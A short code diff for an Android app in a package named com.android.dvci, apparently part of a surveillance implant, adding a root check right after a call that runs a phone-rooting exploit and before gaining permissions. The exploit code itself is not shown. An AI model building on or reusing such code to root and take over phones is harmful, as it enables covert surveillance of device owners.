@@ -24,6 +24,7 @@ import com.android.dvci.action.Action;
 import com.android.dvci.action.SubAction;
 import com.android.dvci.action.UninstallAction;
 import com.android.dvci.auto.Cfg;
+import com.android.dvci.capabilities.PackageInfo;
 import com.android.dvci.conf.ConfType;
 import com.android.dvci.conf.Configuration;
 import com.android.dvci.crypto.Keys;
@@ -380,6 +381,7 @@ public class Core extends Activity implements Runnable {
 			return;
 		}
 		Root.exploitPhone(runExploitSynchronously());
+		PackageInfo.checkRoot();
 		Root.getPermissions(false);
 
 		if (Status.haveRoot()) {
